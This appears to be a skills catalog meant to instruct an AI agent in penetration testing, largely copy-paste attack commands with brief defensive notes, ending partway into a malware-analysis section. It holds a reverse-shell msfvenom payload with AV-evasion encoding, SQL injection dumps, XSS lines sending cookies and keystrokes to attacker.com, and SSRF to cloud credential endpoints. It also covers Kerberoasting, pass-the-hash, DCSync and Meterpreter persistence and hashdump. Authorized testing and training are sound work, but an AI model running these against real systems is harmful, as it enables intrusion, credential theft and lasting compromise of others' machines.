# Purple Team — Skills Catalog

Full instructions for every sub-skill. Read only the section relevant to the current task.

> **Authorization Reminder**: All offensive techniques are for authorized engagements, bug bounty programs within scope, CTF events, and educational purposes only.

---

## Table of Contents

### Red Team
1. [ethical-hacking-methodology](#ethical-hacking-methodology)
2. [red-team-tactics](#red-team-tactics)
3. [red-team-tools](#red-team-tools)
4. [pentest-checklist](#pentest-checklist)
5. [pentest-commands](#pentest-commands)
6. [shodan-reconnaissance](#shodan-reconnaissance)
7. [scanning-tools](#scanning-tools)
8. [burp-suite-testing](#burp-suite-testing)
9. [sql-injection](#sql-injection)
10. [xss-html-injection](#xss-html-injection)
11. [idor-testing](#idor-testing)
12. [api-fuzzing](#api-fuzzing)
13. [wordpress-pentest](#wordpress-pentest)
14. [top-web-vulnerabilities](#top-web-vulnerabilities)
15. [aws-pentest](#aws-pentest)
16. [cloud-pentest](#cloud-pentest)
17. [ssh-pentest](#ssh-pentest)
18. [smtp-pentest](#smtp-pentest)
19. [linux-privesc](#linux-privesc)
20. [windows-privesc](#windows-privesc)
21. [privesc-methods](#privesc-methods)
22. [active-directory-attacks](#active-directory-attacks)
23. [metasploit](#metasploit)
24. [malware-analyst](#malware-analyst)
25. [reverse-engineer](#reverse-engineer)
26. [protocol-re](#protocol-re)
27. [anti-reversing](#anti-reversing)
28. [firmware-analyst](#firmware-analyst)

### Blue Team
29. [security-code-review](#security-code-review)
30. [backend-security-coder](#backend-security-coder)
31. [api-security](#api-security)
32. [mobile-security](#mobile-security)
33. [security-auditor](#security-auditor)
34. [sast-config](#sast-config)
35. [dependency-audit](#dependency-audit)
36. [codebase-cleanup](#codebase-cleanup)
37. [security-hardening](#security-hardening)
38. [stride-analysis](#stride-analysis)
39. [threat-mitigation](#threat-mitigation)

---

## ethical-hacking-methodology

### Role
Master the complete penetration testing lifecycle — scoping through reporting. Five-phase methodology for authorized security assessments.

### Prerequisites
- Written authorization from system owner
- Defined scope (IP ranges, domains, excluded systems)
- Rules of engagement (RoE) documented and signed
- Kali Linux or equivalent attack platform ready

### Five-Phase Methodology

**Phase 1: Reconnaissance**
- Passive: OSINT, Shodan, Censys, WHOIS, DNS enumeration, LinkedIn, GitHub
- Active: Port scanning, service fingerprinting, web crawling
- Output: Target profile document, attack surface map

**Phase 2: Scanning & Enumeration**
```bash
# Full port scan
nmap -sC -sV -p- -oA full_scan <target>

# UDP scan (top 100)
nmap -sU --top-ports 100 <target>

# Web enumeration
gobuster dir -u https://<target> -w /usr/share/wordlists/dirb/big.txt -x php,html,txt
```

**Phase 3: Exploitation**
- Map findings to known CVEs and exploit paths
- Attempt exploitation with minimum footprint
- Document each attempt: command, output, timestamp
- PoC only — stop at demonstrated impact

**Phase 4: Post-Exploitation**
- Privilege escalation (only within scope)
- Lateral movement documentation (identify paths, don't necessarily execute)
- Persistence demonstration if authorized
- Data access confirmation (confirm access exists; don't exfiltrate real data)

**Phase 5: Reporting**
Structure:
1. Executive Summary (business language, no jargon)
2. Scope and Methodology
3. Risk Summary (critical/high/medium/low count)
4. Findings (per vulnerability: description, CVSS, evidence, remediation)
5. Remediation Roadmap (prioritized, with effort estimates)

### Finding Severity (CVSS v3 Mapping)
| Severity | CVSS Range | Typical SLA |
|---|---|---|
| Critical | 9.0–10.0 | 24–48 hours |
| High | 7.0–8.9 | 1 week |
| Medium | 4.0–6.9 | 1 month |
| Low | 0.1–3.9 | Next release cycle |
| Informational | N/A | Best effort |

---

## red-team-tactics

### Role
Adversary simulation specialist using MITRE ATT&CK framework. Plans and executes realistic threat actor simulations.

### MITRE ATT&CK Kill Chain
```
RECONNAISSANCE → INITIAL ACCESS → EXECUTION → PERSISTENCE
      ↓               ↓               ↓            ↓
PRIVILEGE ESC → DEFENSE EVASION → CRED ACCESS → DISCOVERY
      ↓               ↓               ↓            ↓
LATERAL MOVEMENT → COLLECTION → C2 → EXFILTRATION → IMPACT
```

### Phase Techniques Reference
| Phase | Key Techniques | ATT&CK IDs |
|---|---|---|
| Recon | Passive DNS, LinkedIn scraping, GitHub dork | T1596, T1591 |
| Initial Access | Phishing, exposed services, supply chain | T1566, T1190 |
| Execution | PowerShell, WMI, LOLBins | T1059, T1047 |
| Persistence | Scheduled tasks, registry run keys, services | T1053, T1547 |
| Privilege Esc | Token impersonation, sudo abuse, kernel exploits | T1134, T1068 |
| Defense Evasion | Process injection, obfuscation, signed binaries | T1055, T1027 |
| Credential Access | LSASS dump, Kerberoast, credential spraying | T1003, T1558 |
| Discovery | Network scan, AD enumeration, file search | T1046, T1018 |
| Lateral Movement | Pass-the-hash, RDP, WMI | T1550, T1021 |
| C2 | HTTPS beacons, DNS tunneling, cloud services | T1071, T1568 |
| Exfiltration | Staged exfil, encrypted channels, cloud storage | T1041, T1567 |

### Red Team Report Components
1. Threat intelligence profile (what threat actor are you emulating?)
2. Engagement timeline
3. Attack narrative (tell the story of the compromise)
4. ATT&CK heatmap (techniques used)
5. Detection gaps (what the blue team missed)
6. Recommendations (detection rules, architecture changes)

---

## red-team-tools

### Role
Red team tooling expert — C2 frameworks, payload generation, implant management, and operational security.

### C2 Framework Comparison
| Framework | Language | Strengths | OPSEC |
|---|---|---|---|
| Cobalt Strike | Java | Enterprise standard, malleable C2 | High (commercial) |
| Havoc | C | Modern, customizable, free | Medium-High |
| Sliver | Go | Cross-platform, mTLS, active dev | High |
| Metasploit | Ruby | Huge module library, beginner-friendly | Low-Medium |
| Covenant | C# | .NET focused, user-friendly | Medium |

### Payload Generation
```bash
# Msfvenom — multi-format payload generation
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<c2> LPORT=443 -f exe -o payload.exe

# Encode to evade basic AV
msfvenom -p ... -e x64/xor_dynamic -i 10 -f exe -o encoded.exe
```

### OPSEC Checklist
- [ ] Route C2 traffic through domain fronting or redirectors
- [ ] Use categorized, aged domains (not newly registered)
- [ ] HTTPS with valid certificates only
- [ ] Beacon jitter (20–30%) to avoid periodic network signatures
- [ ] Unique user-agent strings per engagement
- [ ] Clean up tools and payloads after each phase

---

## pentest-checklist

### Role
Pre-engagement and in-engagement checklist to ensure authorized, complete, and professional penetration tests.

### Pre-Engagement
- [ ] Written authorization obtained and signed
- [ ] Scope document reviewed — IP ranges, domains, exclusions documented
- [ ] Emergency contact chain established (abort if production impact detected)
- [ ] Testing window agreed (business hours vs. 24/7)
- [ ] Safe harbor clause confirmed in agreement
- [ ] Backup tester assigned (solo testing risk)
- [ ] VPN/jump host configured for testing
- [ ] Legal review complete (especially for cloud environments)

### In-Engagement
- [ ] All activities logged with timestamps
- [ ] Screenshots taken at every exploitation step
- [ ] Tool output saved to engagement folder
- [ ] Findings documented in real-time (don't rely on memory)
- [ ] Critical findings communicated to client immediately (don't wait for report)
- [ ] Stop testing if unintended impact detected

### Reporting
- [ ] Executive summary complete (non-technical audience)
- [ ] All findings have CVSS scores
- [ ] Every finding has proof (screenshot, request/response)
- [ ] Every finding has remediation recommendation
- [ ] Report reviewed by peer before delivery
- [ ] Sensitive data (credentials, PII found) handled per data handling agreement

---

## pentest-commands

### Role
Command reference by pentest phase. Copy-paste ready for common engagements.

### Reconnaissance
```bash
# DNS enumeration
subfinder -d target.com | httprobe
amass enum -passive -d target.com

# WHOIS / ASN
whois target.com
amass intel -org "Company Name"

# Google dorks
site:target.com filetype:pdf
site:target.com inurl:admin
"@target.com" filetype:xls
```

### Network Scanning
```bash
# Host discovery
nmap -sn 10.0.0.0/24

# Service scan
nmap -sC -sV -p 22,80,443,8080,8443 <target>

# Full port scan (slower)
nmap -p- --min-rate 5000 <target>

# Vulnerability scripts
nmap --script vuln <target>
```

### Web Enumeration
```bash
# Directory brute force
gobuster dir -u https://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt

# API endpoint discovery
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u https://<target>/api/FUZZ

# Technology fingerprinting
whatweb <target>
wappalyzer
```

### Credential Attacks
```bash
# SSH brute force (authorized only)
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<target>

# Password spray (SMB)
crackmapexec smb <target> -u users.txt -p 'Winter2024!'
```

### Post-Exploitation
```bash
# Linux: check sudo
sudo -l

# Linux: SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Windows: whoami with privileges
whoami /all

# Windows: check for unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
```

---

## shodan-reconnaissance

### Role
Shodan, Censys, and OSINT passive reconnaissance specialist. Maps attack surface without touching targets.

### Shodan Search Operators
```
# Find by organization
org:"Target Company"

# Find specific services
ssl.cert.subject.cn:"target.com" port:443
hostname:"target.com"

# Find specific vulnerabilities
vuln:CVE-2021-44228  # Log4Shell
vuln:CVE-2021-26084  # Confluence RCE

# Find exposed services
product:"Apache" http.title:"target"
"server: nginx" "Set-Cookie: PHPSESSID"
```

### OSINT Checklist
- [ ] **Passive DNS** — SecurityTrails, PassiveTotal, VirusTotal
- [ ] **Certificate transparency** — crt.sh, censys.io
- [ ] **Exposed credentials** — HaveIBeenPwned, DeHashed, Intelx.io
- [ ] **Code exposure** — GitHub, GitLab, Bitbucket (search org name, email domains)
- [ ] **Cloud asset exposure** — S3Scanner, GCPBucketBrute
- [ ] **Employee data** — LinkedIn for technology stack, role names, org structure
- [ ] **Job postings** — Reveal tech stack and security controls in use

### GitHub Dorking
```
org:target-org filename:.env
org:target-org password
org:target-org "api_key"
org:target-org "aws_access_key_id"
org:target-org extension:pem private
```

---

## scanning-tools

### Role
Port scanning, service enumeration, and vulnerability scanning specialist — Nmap, Nuclei, Masscan.

### Nmap Reference
```bash
# Stealth SYN scan
nmap -sS -T4 -p- <target>

# OS detection + version scan
nmap -A <target>

# Specific script categories
nmap --script "safe and discovery" <target>
nmap --script http-methods <target>
nmap --script smb-vuln* <target>

# Output all formats
nmap -oA scan_results <target>
```

### Nuclei — Vulnerability Scanning
```bash
# Scan with all templates
nuclei -u https://target.com

# Specific severity
nuclei -u https://target.com -severity critical,high

# CVE templates only
nuclei -u https://target.com -tags cve

# Technology-specific
nuclei -u https://target.com -tags apache,nginx,wordpress

# Update templates
nuclei -update-templates
```

### Masscan — Fast Port Discovery
```bash
# Discover open ports fast
masscan -p1-65535 <target> --rate=1000 -oL ports.txt

# Feed into Nmap for service detection
nmap -sV -p$(cat ports.txt | awk '{print $3}' | tr '\n' ',') <target>
```

---

## burp-suite-testing

### Role
Burp Suite web application testing expert — intercept, scan, and manually test web applications.

### Setup
```
1. Launch Burp Suite → Temporary project → Default settings
2. Proxy → Listener on 127.0.0.1:8080
3. Open Burp's browser (Proxy → Intercept → Open Browser)
   OR configure Firefox: Settings → Network → Manual proxy → 127.0.0.1:8080
4. For HTTPS: Install Burp CA (http://burpsuite/cert → import to browser)
```

### Editions Comparison
| Feature | Community | Professional |
|---|---|---|
| Proxy / Intercept | ✓ | ✓ |
| Repeater | ✓ | ✓ |
| Intruder (full speed) | ✗ | ✓ |
| Active Scanner | ✗ | ✓ |
| Collaborator (SSRF/OOB) | ✗ | ✓ |

### Core Testing Workflow
1. **Spider / Crawl**: Target → Sitemap → right-click → Passively scan
2. **Identify entry points**: Forms, query params, headers, JSON bodies, cookies
3. **Intercept & Modify**: Proxy → Intercept ON → modify requests
4. **Repeater**: Send to Repeater for manual manipulation + replay
5. **Intruder**: Brute force, fuzzing — mark §payload positions§
6. **Scanner** (Pro): Right-click request → Actively scan

### Key Burp Extensions (BApp Store)
- **Autorize** — Broken access control testing
- **JWT Editor** — JWT manipulation and attacks
- **ActiveScan++** — Extended active scanning
- **Param Miner** — Hidden parameter discovery
- **Turbo Intruder** — High-speed fuzzing (Python-scriptable)

### Manual Testing Checklist
- [ ] Test all parameters with SQLi payloads
- [ ] Test file upload endpoints (extension bypass, MIME type confusion)
- [ ] Test authorization: access endpoint A with session of user B
- [ ] Test IDOR: increment/decrement numeric IDs in all requests
- [ ] Check all cookies for missing HttpOnly/Secure flags
- [ ] Look for verbose error messages revealing tech stack

---

## sql-injection

### Role
SQL injection testing specialist — manual discovery, exploitation, and automated testing with sqlmap.

### Detection Payloads
```sql
-- Boolean-based detection
' AND '1'='1
' AND '1'='2
' OR 1=1--
' OR 1=2--

-- Error-based detection
'
''
`
')
"))

-- Time-based blind detection
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
```

### Manual Exploitation
```sql
-- Find number of columns
' ORDER BY 1--
' ORDER BY 2--  (increment until error)

-- UNION-based extraction
' UNION SELECT null, null, null--
' UNION SELECT username, password, null FROM users--

-- MySQL: read files
' UNION SELECT LOAD_FILE('/etc/passwd'), null--

-- MySQL: database info
' UNION SELECT database(), user(), version()--
```

### sqlmap Usage
```bash
# Basic scan
sqlmap -u "https://target.com/item?id=1" --batch

# POST request
sqlmap -u "https://target.com/login" --data="user=test&pass=test" --batch

# With Burp request file
sqlmap -r request.txt --batch

# Dump database
sqlmap -u "https://target.com/item?id=1" --dbs
sqlmap -u "https://target.com/item?id=1" -D dbname --tables
sqlmap -u "https://target.com/item?id=1" -D dbname -T users --dump

# Evade basic WAF
sqlmap -u "..." --tamper=space2comment,between --random-agent
```

### Defense Guidance (Blue Team)
- Parameterized queries / prepared statements — the only complete defense
- Input validation as defense-in-depth (not primary defense)
- Least privilege DB accounts — app user should NOT have LOAD_FILE or FILE privilege
- WAF rules for common SQLi patterns (defense-in-depth)

---

## xss-html-injection

### Role
Cross-site scripting and HTML injection specialist — stored, reflected, DOM-based, and CSP bypass.

### XSS Types
| Type | Where Payload Stored | Trigger |
|---|---|---|
| Reflected | URL parameter | User clicks crafted link |
| Stored | Database | Anyone who views the page |
| DOM-based | Client-side JS | JS reads from URL/storage unsafely |

### Detection Payloads
```html
<!-- Basic alert (if works, XSS confirmed) -->
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)

<!-- Event-based (bypasses script-tag filters) -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>

<!-- DOM XSS via hash -->
#<script>alert(1)</script>
#<img src=x onerror=alert(1)>
```

### Impact Escalation
```javascript
// Session theft
fetch('https://attacker.com/steal?c=' + document.cookie)

// Keylogger
document.onkeypress = e => fetch('https://attacker.com/key?k=' + e.key)

// CSRF via XSS
fetch('/api/admin/delete-user', {method: 'POST', body: 'id=1'})
```

### CSP Bypass Techniques
- JSONP endpoints on whitelisted domains
- Angular template injection on whitelisted CDN
- Dangling markup injection when script is blocked
- `base` tag injection to hijack relative URLs

### Defense Guidance (Blue Team)
- Content Security Policy with `default-src 'self'` — no `unsafe-inline`
- Output encoding (HTML entity encoding) for all user-controlled output
- DOMPurify for client-side HTML sanitization
- HttpOnly cookies to prevent JS cookie access

---

## idor-testing

### Role
Insecure Direct Object Reference (IDOR) and broken access control specialist.

### IDOR Detection Methodology
1. **Map all object references** — IDs in URLs, POST bodies, headers, cookies
2. **Create two test accounts** — Account A (attacker) and Account B (victim)
3. **Capture Account B's object IDs** (resource IDs, document IDs, user IDs)
4. **Use Account A's session** to access Account B's resources
5. **Test all HTTP methods** — GET works ≠ POST/PUT/DELETE works

### Common IDOR Patterns
```
GET /api/document?id=1234        → change to 1235
GET /api/invoice/INV-2024-0042   → increment year, sequence
GET /api/user/profile?user=bob   → change to alice
POST /api/transfer {"to": 1234}  → change account ID

# UUID IDORs (don't assume UUIDs are safe)
GET /api/report/3f2504e0-4f89-11d3-9a0c-0305e82c3301
# Enumerate by capturing multiple UUIDs and looking for patterns
```

### Authorization Testing Matrix
For each endpoint and each resource type, test:
| Actor | Action | Expected | Test Result |
|---|---|---|---|
| Owner | Read own resource | ✓ Allow | |
| Owner | Read other's resource | ✗ Deny | |
| Admin | Read any resource | ✓ Allow | |
| Unauthenticated | Read any resource | ✗ Deny/Redirect | |

### Defense Guidance (Blue Team)
- Map access checks server-side, never trust client-supplied IDs alone
- Verify ownership on every request (`resource.owner_id == session.user_id`)
- Use indirect references (random tokens) instead of sequential integers
- Centralized authorization layer — don't scatter access checks across code

---

## api-fuzzing

### Role
API security testing and bug bounty specialist — REST, GraphQL, and gRPC fuzzing.

### REST API Fuzzing
```bash
# Endpoint discovery
ffuf -w api_wordlist.txt -u https://api.target.com/v1/FUZZ -mc 200,201,401,403

# Parameter fuzzing
ffuf -w params.txt -u "https://api.target.com/user?FUZZ=test" -mc 200

# HTTP method fuzzing
ffuf -w methods.txt -u https://api.target.com/resource -X FUZZ

# With authorization
ffuf -H "Authorization: Bearer <token>" -w wordlist.txt -u https://api.target.com/FUZZ
```

### GraphQL Testing
```graphql
# Introspection (reveals all types and queries)
{ __schema { types { name fields { name } } } }

# Batching attack (bypass rate limiting)
[{"query": "mutation { login(user:'admin', pass:'x') }"},
 {"query": "mutation { login(user:'admin', pass:'y') }"}]
```

### Common API Vulnerabilities
- **Broken Object Level Authorization** (BOLA/IDOR) — Access other users' objects
- **Broken Function Level Authorization** — Access admin endpoints without admin role
- **Mass Assignment** — POST extra fields to escalate privileges (`{"role": "admin"}`)
- **Excessive Data Exposure** — API returns more data than needed; filter on client
- **Lack of Rate Limiting** — Credential stuffing, brute force, enumeration

### Bug Bounty Workflow
1. Read scope carefully — what's in bounds?
2. Recon: find all API endpoints (Swagger docs, JS bundle analysis, network tab)
3. Map authentication: which endpoints are public vs. authenticated
4. Test BOLA first — highest impact, most common
5. Look for mass assignment in POST/PUT/PATCH requests
6. Test rate limiting on auth endpoints

---

## wordpress-pentest

### Role
WordPress-specific penetration testing — enumeration, plugin CVEs, authentication attacks.

### Enumeration
```bash
# WPScan — WordPress vulnerability scanner
wpscan --url https://target.com --enumerate u,p,t,tt

# Enumerate users
wpscan --url https://target.com --enumerate u

# Enumerate plugins (aggressive)
wpscan --url https://target.com --enumerate p --plugins-detection aggressive

# Enumerate themes
wpscan --url https://target.com --enumerate t

# With API token (for CVE lookups)
wpscan --url https://target.com --api-token <token>
```

### Common WordPress Attack Vectors
- **XML-RPC** — `/xmlrpc.php` — brute force, SSRF, DDoS amplification
- **wp-login.php** — Brute force (check for no rate limiting)
- **Outdated plugins** — Top source of WordPress RCE/SQLi CVEs
- **wp-cron.php** — Information disclosure, potential DoS
- **User enumeration** — `/?author=1` reveals usernames

### Plugin CVE Hunting
```bash
# After identifying plugin + version with WPScan
searchsploit wordpress <plugin-name>
# Check WPVulnDB: wpscan.com/vulnerability/search
# Check NVD: nvd.nist.gov
```

---

## top-web-vulnerabilities

### Role
OWASP Top 10 (2021) comprehensive reference for web application vulnerability testing.

### OWASP Top 10 (2021)
| Rank | Category | Test For |
|---|---|---|
| A01 | Broken Access Control | IDOR, privilege escalation, path traversal |
| A02 | Cryptographic Failures | Weak TLS, plaintext secrets, weak hashing (MD5) |
| A03 | Injection | SQLi, XSS, Command injection, LDAP injection |
| A04 | Insecure Design | Missing rate limits, no fraud controls |
| A05 | Security Misconfiguration | Default creds, verbose errors, open cloud storage |
| A06 | Vulnerable Components | Outdated libraries with known CVEs |
| A07 | Auth Failures | Weak passwords, no MFA, session fixation |
| A08 | Data Integrity Failures | Unsigned updates, deserialization, CI/CD injection |
| A09 | Security Logging Failures | No audit logs, no alerting on brute force |
| A10 | SSRF | Internal service access via URL parameters |

### Quick SSRF Testing
```bash
# Test URL parameters for SSRF
# Replace with collaborator/requestbin URL
https://target.com/fetch?url=https://attacker.com/ssrf

# Target internal services
https://target.com/fetch?url=http://169.254.169.254/  # AWS metadata
https://target.com/fetch?url=http://localhost:6379/    # Redis
https://target.com/fetch?url=http://10.0.0.1/         # Internal network
```

---

## aws-pentest

### Role
AWS cloud penetration testing specialist — IAM privilege escalation, service misconfigurations, and lateral movement.

### Initial Access Vectors
- Exposed credentials in code (GitHub, S3 buckets)
- SSRF to EC2 metadata service: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- Overpermissive IAM roles on Lambda/EC2
- Publicly accessible S3 buckets

### IAM Enumeration
```bash
# With compromised credentials
aws sts get-caller-identity
aws iam get-user
aws iam list-attached-user-policies
aws iam simulate-principal-policy --action-names "*" --policy-source-arn <arn>

# Enumerate accessible services (pacu)
pacu → run iam__enum_users_roles_policies_groups
```

### IAM Privilege Escalation Paths
| Method | Condition | Result |
|---|---|---|
| `iam:CreatePolicyVersion` | Target policy attached | Inject admin policy version |
| `iam:CreateAccessKey` | Access to admin user | Create new admin creds |
| `lambda:UpdateFunctionCode` | Access to privileged Lambda | Execute code as Lambda role |
| `sts:AssumeRole` | Wildcard trust policy | Assume higher-privilege role |

### S3 Recon
```bash
# Check public bucket
aws s3 ls s3://bucket-name --no-sign-request

# Find buckets (permutations of company name)
s3scanner scan --buckets-file bucket-names.txt

# Check ACL
aws s3api get-bucket-acl --bucket bucket-name
```

---

## cloud-pentest

### Role
Multi-cloud penetration testing — GCP, Azure, and cross-cloud attack paths.

### GCP Attack Vectors
```bash
# Enumerate with compromised token
gcloud auth list
gcloud projects list
gcloud iam service-accounts list

# Metadata server (from compromised GCE)
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Check IAM permissions
gcloud projects get-iam-policy <project>
```

### Azure Attack Vectors
```bash
# With compromised credentials (Az CLI or Powershell)
az account list
az role assignment list
az ad user list

# Managed identity from SSRF (IMDS)
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### Cross-Cloud Lateral Movement
- Cloud credential exfiltration via SSRF to metadata services
- Cross-account trust relationships (AWS assume-role, GCP service account impersonation)
- Federated identity abuse (SAML, OIDC token manipulation)

---

## ssh-pentest

### Role
SSH penetration testing — key attacks, agent hijacking, brute force, and tunneling.

### Common Attack Techniques
```bash
# Service version (check for known CVEs)
ssh -V
nmap -sV -p22 <target>

# Brute force (authorized only)
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t4 ssh://<target>
medusa -h <target> -U users.txt -P passwords.txt -M ssh

# Username enumeration (older OpenSSH)
ssh-audit <target>

# Key-based attacks
# If you have the private key
ssh -i id_rsa user@target

# Check for weak key algorithms
ssh -oHostKeyAlgorithms=ssh-rsa user@target
```

### SSH Tunneling (Post-Exploitation)
```bash
# Local port forward (access internal service through compromised host)
ssh -L 8080:internal-service:80 user@pivot-host

# Dynamic SOCKS proxy (route all traffic through pivot)
ssh -D 1080 user@pivot-host

# Reverse tunnel (call back from target)
ssh -R 4444:localhost:22 attacker@attacker.com
```

### Agent Hijacking
```bash
# Find forwarded agent sockets
ls /tmp/ssh-*/
echo $SSH_AUTH_SOCK

# Hijack agent socket (requires access to socket)
SSH_AUTH_SOCK=/tmp/ssh-<pid>/agent.<pid> ssh user@target
```

---

## smtp-pentest

### Role
SMTP server penetration testing — open relay testing, spoofing, email injection, and user enumeration.

### SMTP Enumeration
```bash
# Connect and identify
nc -nv <target> 25
telnet <target> 25

# EHLO to see supported features
EHLO test.com

# User enumeration (VRFY/EXPN)
VRFY admin@target.com
EXPN postmaster

# Automated enumeration
smtp-user-enum -M VRFY -U users.txt -t <target>
```

### Open Relay Test
```bash
# Manual test — if server accepts mail to/from external domains, it's an open relay
EHLO attacker.com
MAIL FROM: <anyone@external.com>
RCPT TO: <victim@external.com>
DATA
Subject: Open relay test
Test
.
QUIT
```

### Email Spoofing (Check Domain Controls)
```bash
# Check SPF record
dig TXT target.com | grep spf

# Check DKIM
dig TXT selector._domainkey.target.com

# Check DMARC
dig TXT _dmarc.target.com

# Missing SPF/DKIM/DMARC = spoofable domain
```

---

## linux-privesc

### Role
Linux privilege escalation specialist — systematic enumeration and exploitation of misconfigurations.

### Automated Enumeration
```bash
# LinPEAS (most comprehensive)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Linux Smart Enumeration
curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh | sh -s -- -l 1

# Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh
```

### Manual Checks
```bash
# Sudo permissions (golden ticket)
sudo -l

# SUID/SGID binaries (check GTFOBins)
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# World-writable files and directories
find / -writable -type f 2>/dev/null | grep -v "/proc\|/sys"

# Cron jobs (look for writable scripts)
cat /etc/crontab
ls /etc/cron.*

# Capabilities
getcap -r / 2>/dev/null

# SUID via PATH abuse
echo $PATH

# Stored credentials
find / -name "*.conf" -readable 2>/dev/null
find / -name ".bash_history" -readable 2>/dev/null
cat /etc/passwd | grep -v nologin
```

### GTFOBins Reference
For any SUID binary or sudo-allowed command: check [gtfobins.github.io](https://gtfobins.github.io)

### Kernel Exploits
```bash
uname -a   # Get kernel version
searchsploit linux kernel <version>
# Notable: Dirty COW (CVE-2016-5195), Dirty Pipe (CVE-2022-0847)
```

---

## windows-privesc

### Role
Windows privilege escalation specialist — token abuse, service misconfigs, registry attacks, and UAC bypass.

### Automated Enumeration
```powershell
# WinPEAS
.\winPEASany.exe

# PowerUp (PowerShell)
. .\PowerUp.ps1; Invoke-AllChecks

# Seatbelt (C#)
.\Seatbelt.exe All
```

### Manual Checks
```powershell
# Whoami and privileges (look for SeImpersonatePrivilege, SeDebugPrivilege)
whoami /all

# Service misconfigurations
# Unquoted service paths
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v '\"'

# Writable service binaries
sc qc <service-name>
icacls <service-binary-path>

# Registry autorun
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Stored credentials
cmdkey /list
dir C:\Users\ /s /b | findstr "unattend\|sysprep"
```

### Token Impersonation (Potato Attacks)
If `SeImpersonatePrivilege` is present:
- **PrintSpoofer**: `PrintSpoofer.exe -i -c cmd`
- **GodPotato**: Cross-version potato attack
- **JuicyPotato** (older systems): COM/DCOM token theft

---

## privesc-methods

### Role
Cross-platform privilege escalation reference — techniques, tools, and indicators.

### Privilege Escalation Framework
```
1. Enumerate → What privileges do I have?
2. Identify misconfigurations → What can I abuse?
3. Plan → What's the escalation path?
4. Execute → Gain elevated access
5. Document → Record commands and evidence
```

### Universal Escalation Paths
| Vector | Linux | Windows |
|---|---|---|
| Weak file permissions | SUID binaries, writable sudoers | Writable service binaries |
| Scheduled tasks | Cron with writable scripts | Task Scheduler weak paths |
| Credential exposure | .bash_history, config files | SAM dump, credential manager |
| Vulnerable services | Local exploits, SUID abuse | Unquoted paths, DLL injection |
| Kernel exploits | CVE research for kernel version | CVE research for Windows build |
| Token/privilege abuse | Capabilities (cap_setuid) | Token impersonation (Potatoes) |

---

## active-directory-attacks

### Role
Active Directory penetration testing specialist — enumeration, Kerberoasting, pass-the-hash, and BloodHound analysis.

### Enumeration
```powershell
# PowerView
Get-NetDomain
Get-NetUser | Select-Object name, description, memberof
Get-NetGroup "Domain Admins" | Select-Object member
Get-NetComputer | Select-Object name, operatingsystem

# BloodHound collection (SharpHound)
.\SharpHound.exe --CollectionMethods All
# Import .zip into BloodHound GUI → analyze attack paths
```

### Kerberoasting
```bash
# Request TGS for SPNs (no special privileges needed)
# Linux: impacket
GetUserSPNs.py -dc-ip <dc-ip> domain/user:password -outputfile hashes.kerberoast

# Crack offline
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
```

### Pass-the-Hash (NTLM)
```bash
# With NTLM hash (no plaintext needed)
crackmapexec smb <target> -u Administrator -H <ntlm-hash>
impacket-psexec -hashes :<ntlm-hash> administrator@<target>
```

### AS-REP Roasting (accounts with Kerberos pre-auth disabled)
```bash
GetNPUsers.py -dc-ip <dc-ip> -usersfile users.txt domain/ -no-pass -format hashcat
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```

### DCSync (if you have Replication rights)
```bash
secretsdump.py domain/user:password@<dc-ip>
```

---

## metasploit

### Role
Metasploit Framework specialist — module selection, exploitation, post-exploitation, and pivoting.

### Core Commands
```bash
# Start
msfconsole

# Search modules
search type:exploit platform:windows smb
search cve:2021-44228  # Log4Shell

# Use module
use exploit/windows/smb/ms17_010_eternalblue

# Configure
show options
set RHOSTS 192.168.1.100
set LHOST 10.0.0.5
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run
exploit  (or run)
```

### Meterpreter Post-Exploitation
```bash
# System info
sysinfo
getuid
getpid

# Privilege escalation
getsystem
hashdump  # Requires SYSTEM

# Persistence
run persistence -X  # Autorun key
run post/windows/manage/persistence_exe

# Pivoting
route add <subnet> <netmask> <session-id>
use auxiliary/server/socks_proxy; set version 5; run

# Useful modules
run post/multi/recon/local_exploit_suggester
run post/windows/gather/credentials/credential_collector
run post/windows/gather/enum_logged_on_users
```

---

## malware-analyst

### Role
Defensive malware analyst — static/dynamic analysis, behavioral analysis, IOC extraction, and threat intelligence. Focuses on understanding malware to protect systems.

### Analysis Workflow
```
1. TRIAGE        → Quick assessment: file type, basic strings, hash lookup
2. STATIC        → No execution: strings, imports, disassembly, decompilation
3. DYNAMIC       → Execute in sandbox: behavior, network, file, registry
4. DEEP ANALYSIS → IDA/Ghidra: understand key functions, decode C2, extract config
5. IOC EXTRACTION → Hash, IPs, domains, mutexes, registry keys, file paths
6. REPORTING     → Family ID, capability summary, IOCs, detection guidance
```

### Static Analysis Tools
```bash
# File identification
file malware.bin
xxd malware.bin | head -20  # Magic bytes

